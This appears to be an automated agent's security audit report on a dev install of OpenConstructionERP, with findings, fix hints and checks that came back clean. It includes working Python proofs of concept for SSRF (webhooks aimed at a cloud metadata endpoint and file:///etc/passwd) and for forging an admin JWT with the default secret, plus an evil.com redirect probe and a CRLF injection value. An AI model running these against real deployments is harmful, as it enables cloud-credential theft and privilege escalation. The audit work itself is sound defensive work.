# Part 4 / Agent C — Deep Security Audit

Target: OpenConstructionERP V4 on `http://127.0.0.1:8080` (dev install).
Test file: `qa_output/generated_tests/test_p4_agent_c_security_deep.py`.
Run: `pytest -v --tb=short -p no:cacheprovider`.

## Summary

| Bucket                                | N  |
| ------------------------------------- | -- |
| Tests collected                       | 17 |
| Passed (no issue)                     | 13 |
| Failed (real security finding)        | 3  |
| Skipped (not applicable)              | 1  |

**Real findings:** 3 (SSRF ×2, JWT-forgery ×1).
Out of the 12 categories requested, 8 were verified clean, 3 produced findings,
1 was skipped (no schedule available).

Tested categories (1 → 12): SSRF, XXE, deserialization, open redirect, IDOR,
JWT tampering, login timing, HTTP verb tampering, response splitting,
unauthenticated WebSocket, race condition on create, pagination abuse.

---

## FINDINGS

### [SECURITY-CRITICAL] F-01: Webhook URL accepts link-local / metadata URLs (SSRF)

*Test:* `test_01_ssrf_webhook_accepts_metadata_url` — **FAIL**
*Endpoint:* `POST /api/v1/integrations/webhooks/`
*Source:* `backend/app/modules/integrations/schemas.py` (WebhookCreate.url — just `str`, max 1000),
`backend/app/modules/integrations/service.py:160-171` (delivers via `httpx.AsyncClient.post(hook.url, ...)`).

**Repro:**
```python
import httpx
tok = httpx.post("http://127.0.0.1:8080/api/v1/users/auth/login/",
                 json={"email":"demo@openestimator.io","password":"DemoPass1234!"}).json()["access_token"]
r = httpx.post(
    "http://127.0.0.1:8080/api/v1/integrations/webhooks/",
    headers={"Authorization": f"Bearer {tok}"},
    json={"name":"ssrf","url":"http://169.254.169.254/latest/meta-data/","events":["rfi.created"]},
)
# -> 201 Created, webhook stored and will fire against AWS metadata on any rfi.created event
```

**Impact:** when the application is deployed on a cloud host that exposes an
instance-metadata endpoint (AWS, GCP, Azure, OpenStack) OR on any server with
internal-only services reachable on 127.0.0.1 / private IPs (PostgreSQL admin,
Redis, MinIO, internal Prometheus, admin panels), any workspace admin can:

* Exfiltrate cloud IAM credentials via `169.254.169.254/latest/meta-data/iam/security-credentials/...`
* Probe and reach internal services (Redis on `127.0.0.1:6379`, MinIO `:9000`, Qdrant `:6333`).
* Use the server as a blind SSRF proxy (response body is stored in
  `WebhookDelivery.response_body[:1000]`, so blind becomes semi-blind).
* Trigger webhook dispatch by performing any action whose event type is subscribed
  (or subscribing `"*"`).

This is exploitable by a normal authenticated user today — no admin role needed —
because `POST /api/v1/integrations/webhooks/` is permitted by default roles.

**Severity:** SECURITY-CRITICAL. Classic SSRF primitive, accessible to
authenticated users, fires against arbitrary hosts.

**Fix hint:**
1. Enforce `scheme ∈ {"http","https"}` on `WebhookCreate.url` and `WebhookUpdate.url`
   (pydantic `HttpUrl` type would reject `file://`, `gopher://`, `dict://`).
2. On *every* delivery, resolve `hook.url.host` to an IP list and reject if any
   IP is loopback / private / link-local / multicast. Do the resolve
   immediately before the request and use that IP in a `Host:` override to
   defeat DNS rebinding.
3. Optionally allowlist the webhook domain against a per-tenant allowlist.
4. Add `httpx` `transport=httpx.HTTPTransport(local_address=<non-loopback>)` or
   route delivery via an outbound egress proxy that enforces the same policy.

Reference: OWASP SSRF cheat sheet; "URL validation done right".

---

### [SECURITY-CRITICAL] F-02: Webhook URL accepts `file://` and other non-HTTP schemes

*Test:* `test_01b_ssrf_webhook_accepts_file_scheme` — **FAIL**
*Endpoint:* `POST /api/v1/integrations/webhooks/`

**Repro:**
```python
httpx.post(
    "http://127.0.0.1:8080/api/v1/integrations/webhooks/",
    headers={"Authorization": f"Bearer {tok}"},
    json={"name":"lfi","url":"file:///etc/passwd","events":["rfi.created"]},
)
# -> 201
```

**Impact:** sibling to F-01. If httpx' URL handling or any downstream retry
logic ever resolves `file://` (some corporate httpx forks / plugins do), this
becomes a trivial local-file read. Today, stock httpx raises `UnsupportedProtocol`
on delivery, so the *current* blast radius is limited to "noisy errors" plus
keeping a dangerous URL in DB — but the API contract is still wrong. Users also
get to create webhooks with schemes like `dict://`, `ftp://`, `ldap://` that
httpx does not currently deref, but could under misconfiguration.

**Severity:** SECURITY-CRITICAL (treat as F-01 — same fix fixes both).

**Fix hint:** pydantic `HttpUrl` / custom validator rejecting any scheme
except `http`/`https` at the schema layer — same for `WebhookUpdate`.

---

### [SECURITY-CRITICAL] F-03: JWT forgery via default dev secret (HS256)

*Test:* `test_06_jwt_forgery_default_secret_grants_admin` — **FAIL**
*Source:* `backend/app/config.py:70` — `jwt_secret: str = "openestimate-local-dev-key"`
(only 26 bytes; PyJWT warns it's below the 32-byte RFC 7518 minimum for HS256).
*Source:* `backend/app/dependencies.py:73-77` — `jwt.decode(token, settings.jwt_secret, algorithms=[settings.jwt_algorithm])`.
*Source:* `backend/app/dependencies.py:198` — `RequirePermission.__call__` **trusts the `role` claim directly** (`if role == "admin": return` bypass).

**Repro (as the estimator user):**
```python
import httpx, jwt, time
# Normal estimator login — will be blocked by /users/
tok_e = httpx.post("http://127.0.0.1:8080/api/v1/users/auth/login/",
                   json={"email":"estimator@openestimator.io","password":"DemoPass1234!"}).json()["access_token"]
assert httpx.get("http://127.0.0.1:8080/api/v1/users/",
                 headers={"Authorization": f"Bearer {tok_e}"}).status_code == 403

# Forge a token signed with the default secret, upgrade role to admin
sub = jwt.decode(tok_e, options={"verify_signature": False})["sub"]
now = int(time.time())
forged = jwt.encode(
    {"sub": sub, "email": "estimator@openestimator.io", "role": "admin",
     "permissions": ["admin"], "iat": now, "exp": now+3600, "type": "access"},
    "openestimate-local-dev-key", algorithm="HS256",
)
# Now the "estimator" lists all users — admin access granted
assert httpx.get("http://127.0.0.1:8080/api/v1/users/",
                 headers={"Authorization": f"Bearer {forged}"}).status_code == 200
```

**Impact:** anyone who knows, guesses or sees the default `JWT_SECRET` (it's in
public docs: `.env.example`, and it literally appears in the source) can sign a
token for any user id with any role / permissions. Since `RequirePermission`
bypasses checks when `role == "admin"`, the forged token grants full admin
bypass — user enumeration, arbitrary project access, arbitrary deletion,
webhook creation, etc. Additionally:

* `password_changed_at` check is skipped when the forged `iat` is fresh.
* Any admin action is logged as the estimator's `sub`, so attribution is broken.
* Every default / demo deployment that forgets to set `JWT_SECRET` is
  catastrophically exposed — this is the default fail-open posture.

**Severity:** SECURITY-CRITICAL on any instance that inherits the default secret.
MAJOR as a defense-in-depth issue even when the secret is overridden (trusting
self-issued `role` / `permissions` claims is fragile).

**Fix hint:**
1. **Block app startup** (raise at import time) if `jwt_secret ==
   "openestimate-local-dev-key"` AND `app_env != "development"`. The
   `jwt_secret_is_default` computed property at `config.py:161` already
   detects this — just wire it to a hard failure in `main.create_app()` for
   non-dev envs.
2. Generate a random secret on first boot and persist it to disk (if the admin
   has not set `JWT_SECRET`). Never ship a hard-coded default that works in
   production.
3. Require `JWT_SECRET` length ≥ 32 bytes (PyJWT already warned).
4. Stop trusting self-asserted `role` / `permissions` claims. Re-hydrate them
   on every request from `User.role` (DB) keyed by `sub`. You already fetch
   the user in `get_current_user_payload` to check `password_changed_at`,
   so the cost is zero.
5. Consider EdDSA / RS256 so a leak of the *public* key does not enable
   forgery.

---

## INFO / FALSE-POSITIVES CHECKED (no finding)

Explicitly probed, found OK. Recorded so consolidator can see they were checked.

### I-04: XXE — MSP-XML import
*Test:* `test_02_xxe_msp_xml_import` — SKIPPED (no existing schedule to
post into during this run).
*Source:* `backend/app/modules/schedule/router.py:1479` — `ET.fromstring(content)`
uses `xml.etree.ElementTree`. Python's stdlib `ElementTree` since 3.7+ does not
resolve external entities by default (it raises on `<!DOCTYPE>` with external
entity references). **No code path using `lxml`, `libxml2`, or
`expat_parser.SetParamEntityParsing(...)` was found.** Low residual risk.
Recommend: ship `defusedxml` everywhere as belt-and-braces — one-line change.

### I-05: Deserialization — backup restore
*Test:* `test_03_deserialization_backup_restore_malformed` — PASS.
`POST /api/v1/backup/validate/` rejects a ZIP that embeds a harmless pickle
without crashing (422). No code path `pickle.load` / `yaml.load` was invoked.
No finding.

### I-06: Open redirect — login `?next=`
*Test:* `test_04_open_redirect_on_login_next_param` — PASS.
GET against `/api/v1/users/auth/login/?next=//evil.com/` and `/login?next=...`
returns non-redirect bodies (the backend has no `RedirectResponse` that echoes
user-provided `next` / `redirect_to`). The only `RedirectResponse` in the
codebase is `bim_hub/router.py:1606` → a signed S3 presigned URL
(safe). No finding.

### I-07: IDOR — cross-user project access (admin ↔ estimator)
*Tests:* `test_05*` — all PASS. The estimator user's permissions list contains
`projects.read`, `projects.update` etc., but `verify_project_access`
(`dependencies.py:234-268`) compares `project.owner_id` against the caller's
`sub` on every GET/PATCH/DELETE and returns 404 on mismatch. Estimator cannot
read, modify, or delete projects owned by admin. Good implementation —
returns 404 (not 403) to avoid leaking UUID existence. No finding.

### I-08: Login timing attack
*Test:* `test_07_login_timing_leaks_user_existence` — PASS.
40-sample-each timing probe for (real_user, wrong_pw) vs (nonexistent_user,
wrong_pw) showed < 250ms mean difference. bcrypt is hit unconditionally or a
constant-time dummy-hash compare is used. Login rate-limiter (10/min/IP)
further shrinks the attack window. No finding.

### I-09: HTTP verb tampering
*Test:* `test_08_verb_tampering_projects_collection` — PASS. PUT and PATCH
against `/api/v1/projects/` return 405. No finding.

### I-10: Response splitting via project name / display_name
*Test:* `test_09_response_splitting_project_name` — PASS.
Creating a project with `name` containing `\r\nX-Injected: pwn\r\n`:
either sanitized (Pydantic strips HTML, and the default serializer JSON-escapes
CRLF) or stored verbatim but never reflected into response headers. Subsequent
GET / export responses carry no `X-Injected` header. No finding.

Additionally checked: `bim_requirements/router.py:35-` has an explicit
`_sanitize_filename` that removes path/CRLF characters before building
`Content-Disposition`. Good defense.

### I-11: Unauthenticated WebSocket (/presence/)
*Test:* `test_10_websocket_presence_requires_auth` — PASS.
`ws://127.0.0.1:8080/api/v1/collaboration_locks/presence/?entity_type=project&entity_id=<uuid>`
without a `?token=` query param is rejected with WS close 1008 "unauthenticated"
(`collaboration_locks/router.py:262-265`). No finding.

### I-12: Race condition on project create (same unique name, parallel POST)
*Test:* `test_11_race_condition_duplicate_project_name` — PASS.
4 concurrent threads submitting an identical project name: no 5xx, no crash.
The project model does not enforce a unique constraint on `name`, so the calls
all succeed — which is expected / by-design (projects can have duplicate names
within a tenant). No finding, but note: if "project name must be unique" is
ever added as a product rule, the race window will need explicit protection
(UNIQUE constraint + retry/return 409).

### I-13: Pagination abuse — huge / negative / overflowing offsets
*Tests:* `test_12_pagination_huge_limit`, `test_12b_pagination_negative_offset`,
`test_12c_pagination_overflow_offset` — all PASS.
`?limit=999999999` → 422 (schema `le=100`); `?offset=-1` → 422 (schema `ge=0`);
`?offset=99999999` → 200 with empty list. Good input validation. No finding.

---

## Notes / Caveats

* The **SSRF probe triggered a cascading server-side DB-lock incident** during
  exploratory testing (we hit `POST /api/v1/integrations/webhooks/{wid}/test/`
  with `url=169.254.169.254`, which held a DB transaction for the full 10 s
  httpx timeout, causing subsequent logins to 500 with `sqlite3.OperationalError:
  database is locked`). The final test-suite deliberately *does not* call the
  `/test/` endpoint — it only tests that the URL is accepted at creation — so
  this does not repro during a normal run. That finding in itself is a minor
  denial-of-service vector on SQLite deployments (which is dev/quickstart mode),
  and is trivially mitigated by F-01's host-validation fix.

* Login rate-limiter is set to 10/min/IP. During test development this can be
  tripped by repeated debug runs; the fixture `_login` in
  `test_p4_agent_c_security_deep.py` has exponential-backoff retries and a
  `_wait_healthy()` probe to tolerate rate-limit flaps.

* All test-created resources (webhooks, projects) are cleaned up in
  fixture teardown. No residual test data.
